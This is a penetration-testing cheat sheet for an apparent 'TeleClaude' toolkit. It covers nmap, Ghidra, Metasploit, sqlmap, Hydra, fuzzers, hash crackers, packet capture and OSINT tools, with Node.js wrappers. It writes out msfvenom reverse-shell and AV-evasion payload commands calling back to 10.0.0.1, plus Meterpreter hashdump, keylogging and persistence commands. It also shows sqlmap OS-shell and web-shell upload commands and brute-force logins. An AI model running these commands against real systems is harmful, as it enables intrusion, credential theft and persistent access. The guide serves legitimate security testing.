# Security Tools Reference Guide

Comprehensive documentation for all security tools available in the TeleClaude toolkit.

---

## Table of Contents

1. [Nmap - Network Scanner](#nmap---network-scanner)
2. [Ghidra - Reverse Engineering](#ghidra---reverse-engineering)
3. [Metasploit Framework](#metasploit-framework)
4. [SQLMap - SQL Injection](#sqlmap---sql-injection)
5. [Hydra - Password Cracking](#hydra---password-cracking)
6. [Burp Suite - Web Testing](#burp-suite---web-testing)
7. [Gobuster/Ffuf - Directory Fuzzing](#gobusterffuf---directory-fuzzing)
8. [Hashcat/John - Hash Cracking](#hashcatjohn---hash-cracking)
9. [Wireshark/Tcpdump - Packet Analysis](#wiresharktcpdump---packet-analysis)
10. [Recon Tools - OSINT](#recon-tools---osint)

---

## Nmap - Network Scanner

**The most important reconnaissance tool. Master this first.**

### Basic Syntax

```bash
nmap [scan type] [options] [target]
```

### Essential Scan Types

| Flag | Name | Description | Use Case |
|------|------|-------------|----------|
| `-sS` | SYN Scan | Stealthy, half-open scan | Default for root, fast |
| `-sT` | TCP Connect | Full TCP handshake | When no root access |
| `-sU` | UDP Scan | UDP port scan | DNS, SNMP, DHCP |
| `-sV` | Version Detection | Identify service versions | Know what's running |
| `-sC` | Script Scan | Run default NSE scripts | Quick vuln check |
| `-O` | OS Detection | Fingerprint OS | Know the target OS |
| `-A` | Aggressive | -sV -sC -O --traceroute | Full enumeration |
| `-sn` | Ping Scan | Host discovery only | Find live hosts |

### Port Specification

```bash
nmap -p 22              # Single port
nmap -p 22,80,443       # Multiple ports
nmap -p 1-1000          # Port range
nmap -p-                # All 65535 ports
nmap --top-ports 100    # Top 100 common ports
nmap -F                 # Fast - top 100 ports
```

### Timing Templates

| Flag | Name | Speed | Detection Risk |
|------|------|-------|----------------|
| `-T0` | Paranoid | Very slow | Minimal |
| `-T1` | Sneaky | Slow | Low |
| `-T2` | Polite | Moderate | Low |
| `-T3` | Normal | Default | Medium |
| `-T4` | Aggressive | Fast | Higher |
| `-T5` | Insane | Very fast | High |

### Real-World Examples

```bash
# Quick host discovery on subnet
nmap -sn 192.168.1.0/24

# Fast scan of common ports
nmap -F -T4 192.168.1.100

# Full TCP scan with versions
nmap -sS -sV -p- 192.168.1.100

# Comprehensive scan (aggressive)
nmap -A -T4 192.168.1.100

# Stealth scan avoiding detection
nmap -sS -T2 -f --data-length 50 192.168.1.100

# UDP scan for common services
nmap -sU -p 53,67,68,69,123,161,162,500 192.168.1.100

# Vulnerability scanning
nmap --script vuln 192.168.1.100

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users -p 445 192.168.1.100

# Web server enumeration
nmap --script http-enum -p 80,443 192.168.1.100
```

### NSE Script Categories

```bash
nmap --script=auth        # Authentication bypass
nmap --script=broadcast   # Broadcast discovery
nmap --script=brute       # Brute force attacks
nmap --script=default     # Default scripts (-sC)
nmap --script=discovery   # More info gathering
nmap --script=dos         # Denial of service (CAREFUL!)
nmap --script=exploit     # Active exploitation
nmap --script=external    # External resources
nmap --script=fuzzer      # Fuzzing
nmap --script=intrusive   # Might crash things
nmap --script=malware     # Malware detection
nmap --script=safe        # Safe scripts only
nmap --script=version     # Version detection
nmap --script=vuln        # Vulnerability detection
```

### Output Formats

```bash
nmap -oN output.txt       # Normal output
nmap -oX output.xml       # XML output
nmap -oG output.gnmap     # Grepable output
nmap -oA basename         # All formats
```

### Node.js Integration

```javascript
const { runTool } = require('./utils/wsl_bridge');

// Basic scan
const result = await runTool('nmap', ['-sV', '-p', '1-1000', '192.168.1.100']);

// Parse nmap output
function parseNmapOutput(output) {
  const ports = [];
  const lines = output.split('\n');

  for (const line of lines) {
    const match = line.match(/^(\d+)\/(tcp|udp)\s+(\w+)\s+(.*)$/);
    if (match) {
      ports.push({
        port: parseInt(match[1]),
        protocol: match[2],
        state: match[3],
        service: match[4].trim()
      });
    }
  }
  return ports;
}
```

---

## Ghidra - Reverse Engineering

**NSA's powerful reverse engineering tool for binary analysis.**

### Getting Started

```bash
# Launch GUI (requires display)
ghidra

# Headless analysis (for automation)
analyzeHeadless /path/to/project ProjectName -import /path/to/binary
```

### Headless Mode Commands

```bash
# Basic import and analysis
analyzeHeadless ./ghidra_projects MyProject \
  -import /path/to/binary.exe \
  -postScript ExportFunctions.java

# Analyze without saving
analyzeHeadless ./ghidra_projects MyProject \
  -import /path/to/binary.exe \
  -readOnly \
  -postScript PrintSymbols.java

# Process multiple files
analyzeHeadless ./ghidra_projects MyProject \
  -import /path/to/binaries/ \
  -recursive
```

### Key Analysis Features

| Feature | Description | Use Case |
|---------|-------------|----------|
| **Disassembly** | Convert binary to assembly | Understand code flow |
| **Decompilation** | Generate C pseudocode | Higher-level understanding |
| **Function Graph** | Visual control flow | Complex function analysis |
| **Cross References** | Find where code/data is used | Track variables/functions |
| **Data Types** | Define structures | Understand data formats |
| **Scripting** | Python/Java automation | Batch analysis |

### Common Ghidra Scripts

```python
# Python script to list all functions
# Save as ListFunctions.py in ghidra_scripts/

from ghidra.program.model.listing import FunctionManager

fm = currentProgram.getFunctionManager()
functions = fm.getFunctions(True)

for func in functions:
    print(f"{func.getEntryPoint()}: {func.getName()}")
```

### Node.js Integration

```javascript
const { runInWSL, windowsToWSLPath } = require('./utils/wsl_bridge');

async function analyzeWithGhidra(binaryPath, options = {}) {
  const wslPath = windowsToWSLPath(binaryPath);
  const projectDir = '/tmp/ghidra_projects';
  const projectName = options.projectName || 'analysis';

  // Run headless analysis
  const result = await runInWSL(
    `analyzeHeadless ${projectDir} ${projectName} -import "${wslPath}" -postScript ListFunctions.py`,
    { skipValidation: true, timeout: 600000 }
  );

  return result;
}

// Decompile a specific function
async function decompileFunction(binaryPath, functionAddress) {
  // Use ghidra with decompile script
  const script = `
from ghidra.app.decompiler import DecompInterface
from ghidra.util.task import ConsoleTaskMonitor

decomp = DecompInterface()
decomp.openProgram(currentProgram)

func = getFunctionAt(toAddr("${functionAddress}"))
if func:
    results = decomp.decompileFunction(func, 60, ConsoleTaskMonitor())
    print(results.getDecompiledFunction().getC())
  `;
  // Save and run script...
}
```

### Ghidra Keyboard Shortcuts

| Shortcut | Action |
|----------|--------|
| `G` | Go to address |
| `L` | Label/rename |
| `T` | Set data type |
| `D` | Disassemble |
| `C` | Create code |
| `;` | Add comment |
| `Ctrl+Shift+E` | Show decompiler |
| `X` | Show cross-references |
| `Ctrl+F` | Search |

---

## Metasploit Framework

**Industry-standard exploitation framework.**

### Starting Metasploit

```bash
# Start console
msfconsole

# Start with quiet mode
msfconsole -q

# Execute resource file
msfconsole -r commands.rc
```

### Basic Commands

```bash
# Search for modules
search type:exploit platform:windows smb
search cve:2017-0144

# Use a module
use exploit/windows/smb/ms17_010_eternalblue

# Show options
show options
show payloads
show targets

# Set options
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Run exploit
exploit
# or
run
```

### Payload Generation (msfvenom)

```bash
# Windows reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > shell.exe

# Linux reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf

# Web payloads
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw > shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw > shell.jsp

# Python payload
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw

# Encoded to evade AV
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > encoded.exe
```

### Meterpreter Commands

```bash
# System info
sysinfo
getuid
getpid

# File operations
upload /local/file.exe C:\\remote\\file.exe
download C:\\remote\\file.txt /local/
cat C:\\file.txt
edit C:\\file.txt

# Navigation
pwd
cd C:\\Users
ls

# Privilege escalation
getsystem
hashdump

# Network
ipconfig
route
portfwd add -l 8080 -p 80 -r 10.0.0.5

# Persistence
run persistence -U -i 5 -p 4444 -r 10.0.0.1

# Screenshots/Keylogging
screenshot
keyscan_start
keyscan_dump
```

---

## SQLMap - SQL Injection

**Automated SQL injection and database takeover.**

### Basic Usage

```bash
# Test URL parameter
sqlmap -u "http://target.com/page?id=1"

# With POST data
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"

# With cookies
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"

# From request file (Burp)
sqlmap -r request.txt
```

### Detection Options

```bash
# Specify injection point
sqlmap -u "http://target.com/page?id=1*"  # * marks injection point

# Test specific parameter
sqlmap -u "http://target.com/page?id=1&name=test" -p id

# Specify database type
sqlmap -u "http://target.com/page?id=1" --dbms=mysql

# Risk and level
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3
```

### Enumeration

```bash
# Get databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Get tables
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Get columns
sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --columns

# Dump data
sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --dump

# Dump all
sqlmap -u "http://target.com/page?id=1" --dump-all
```

### Advanced Options

```bash
# OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# SQL shell
sqlmap -u "http://target.com/page?id=1" --sql-shell

# File read
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"

# File write
sqlmap -u "http://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Bypass WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between
```

---

## Hydra - Password Cracking

**Fast network login cracker.**

### Basic Syntax

```bash
hydra [options] target service
```

### Common Services

```bash
# SSH
hydra -l admin -P passwords.txt ssh://192.168.1.100

# FTP
hydra -L users.txt -P passwords.txt ftp://192.168.1.100

# HTTP Basic Auth
hydra -l admin -P passwords.txt http-get://192.168.1.100/admin

# HTTP POST Form
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# SMB
hydra -L users.txt -P passwords.txt smb://192.168.1.100

# RDP
hydra -l administrator -P passwords.txt rdp://192.168.1.100

# MySQL
hydra -l root -P passwords.txt mysql://192.168.1.100

# SSH with key
hydra -l root -P passwords.txt -e nsr ssh://192.168.1.100
```

### Options

| Option | Description |
|--------|-------------|
| `-l` | Single username |
| `-L` | Username list |
| `-p` | Single password |
| `-P` | Password list |
| `-e nsr` | Try null, same as login, reversed |
| `-t` | Threads (default 16) |
| `-f` | Exit on first success |
| `-V` | Verbose mode |
| `-s` | Port number |

---

## Gobuster/Ffuf - Directory Fuzzing

### Gobuster

```bash
# Directory mode
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# With extensions
gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt

# DNS mode
gobuster dns -d target.com -w subdomains.txt

# VHost mode
gobuster vhost -u http://target.com -w vhosts.txt
```

### Ffuf (Faster)

```bash
# Directory fuzzing
ffuf -u http://target.com/FUZZ -w wordlist.txt

# With extensions
ffuf -u http://target.com/FUZZ -w wordlist.txt -e .php,.html,.txt

# POST data fuzzing
ffuf -u http://target.com/login -X POST -d "user=admin&pass=FUZZ" -w passwords.txt

# Header fuzzing
ffuf -u http://target.com -H "Host: FUZZ.target.com" -w subdomains.txt

# Filter by status code
ffuf -u http://target.com/FUZZ -w wordlist.txt -fc 404

# Filter by size
ffuf -u http://target.com/FUZZ -w wordlist.txt -fs 1234

# Match by status
ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301,302
```

---

## Hashcat/John - Hash Cracking

### Hashcat

```bash
# Identify hash type
hashcat --help | grep -i md5

# Dictionary attack
hashcat -m 0 hashes.txt wordlist.txt       # MD5
hashcat -m 1000 hashes.txt wordlist.txt    # NTLM
hashcat -m 1800 hashes.txt wordlist.txt    # SHA-512 Unix

# With rules
hashcat -m 0 hashes.txt wordlist.txt -r rules/best64.rule

# Brute force
hashcat -m 0 hashes.txt -a 3 ?a?a?a?a?a?a  # 6 char all

# Mask attack
hashcat -m 0 hashes.txt -a 3 Company?d?d?d?d
```

### Common Hash Modes

| Mode | Hash Type |
|------|-----------|
| 0 | MD5 |
| 100 | SHA1 |
| 1000 | NTLM |
| 1800 | SHA-512 Unix |
| 3200 | bcrypt |
| 5600 | NetNTLMv2 |
| 13100 | Kerberos TGS |

### John the Ripper

```bash
# Auto-detect hash
john hashes.txt

# Wordlist mode
john --wordlist=passwords.txt hashes.txt

# Show cracked
john --show hashes.txt

# Specific format
john --format=raw-md5 hashes.txt
john --format=nt hashes.txt
```

---

## Wireshark/Tcpdump - Packet Analysis

### Tcpdump

```bash
# Capture all traffic
tcpdump -i eth0

# Capture to file
tcpdump -i eth0 -w capture.pcap

# Read from file
tcpdump -r capture.pcap

# Filter by host
tcpdump -i eth0 host 192.168.1.100

# Filter by port
tcpdump -i eth0 port 80

# Filter by protocol
tcpdump -i eth0 tcp
tcpdump -i eth0 udp
tcpdump -i eth0 icmp

# Complex filter
tcpdump -i eth0 'tcp port 80 and host 192.168.1.100'

# Show packet content
tcpdump -i eth0 -A  # ASCII
tcpdump -i eth0 -X  # Hex + ASCII
```

### Wireshark Filters

```
# Display filters
ip.addr == 192.168.1.100
tcp.port == 80
http
http.request.method == "POST"
dns
tcp.flags.syn == 1
frame contains "password"
```

---

## Recon Tools - OSINT

### theHarvester

```bash
# Email harvesting
theHarvester -d target.com -b google,bing,linkedin

# All sources
theHarvester -d target.com -b all
```

### Amass

```bash
# Passive enum
amass enum -passive -d target.com

# Active enum
amass enum -active -d target.com

# With config
amass enum -d target.com -config config.ini
```

### Subfinder

```bash
# Find subdomains
subfinder -d target.com

# Output to file
subfinder -d target.com -o subs.txt
```

---

## Quick Reference Card

### Reconnaissance Flow

```
1. Passive Recon
   - theHarvester, amass, subfinder
   - Google dorking, Shodan

2. Active Recon
   - nmap -sn (host discovery)
   - nmap -sV -sC (service scan)
   - gobuster/ffuf (web fuzzing)

3. Vulnerability Assessment
   - nmap --script vuln
   - nikto
   - nuclei

4. Exploitation
   - searchsploit
   - metasploit
   - custom exploits

5. Post-Exploitation
   - privilege escalation
   - persistence
   - lateral movement
```

### Common Ports

| Port | Service |
|------|---------|
| 21 | FTP |
| 22 | SSH |
| 23 | Telnet |
| 25 | SMTP |
| 53 | DNS |
| 80 | HTTP |
| 110 | POP3 |
| 139 | NetBIOS |
| 143 | IMAP |
| 443 | HTTPS |
| 445 | SMB |
| 3306 | MySQL |
| 3389 | RDP |
| 5432 | PostgreSQL |
| 5900 | VNC |
| 8080 | HTTP Alt |

---

*Last updated: 2026-01-31*
*Part of TeleClaude Security Toolkit*
